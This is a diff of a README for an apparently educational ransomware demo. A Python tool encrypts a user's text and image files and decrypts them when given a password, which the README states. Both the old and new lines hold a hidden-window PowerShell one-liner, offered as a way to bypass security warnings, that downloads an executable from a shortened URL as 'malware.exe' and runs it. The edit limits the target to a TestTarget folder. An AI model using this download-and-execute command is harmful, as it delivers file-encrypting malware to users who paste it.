@@ -8,7 +8,7 @@
 
 Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory it is ran in.
 
-If combined with the PowerShell script below (or with the Digispark .ino file), the application gets downloaded and executed by default in path `{USER}\Documents\` 
+If combined with the PowerShell script below, the application gets downloaded and executed by default in path `{USER}\TestTarget\` 
 
 Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files when user gives up the right password (lihapulla).
 
@@ -23,10 +23,16 @@ $ ./encrypt.py
 ```
 OR
 
-Bypass security warnings and download & execute the file instantly in Documents folder by typing the following code into Run (Win+R) on **Windows**:
+Make a folder called TestTarget in the path C:/Users/{USER}/
+
+![2023-11-28_11-37](https://github.com/therealhalonen/PhishSticks/assets/112076418/f4512e62-048c-42c9-ab48-88620d11aeee)
+
+Bypass security warnings and download & execute the file instantly in TestTarget folder by typing the following code into Run (Win+R) on **Windows**:
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\Documents\malware.exe\");Start-Process \"$env:UserProfile\Documents\malware.exe\" -WorkingDirectory \"$env:UserProfile\Documents\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\TestTarget\malware.exe\");Start-Process \"$env:UserProfile\TestTarget\malware.exe\" -WorkingDirectory \"$env:UserProfile\TestTarget\""
 ```
+If you don't have a folder called TestTarget and you execute the code above, nothing happens.
+
 
 How it works: https://www.youtube.com/watch?v=glqK_-qdDkw
 
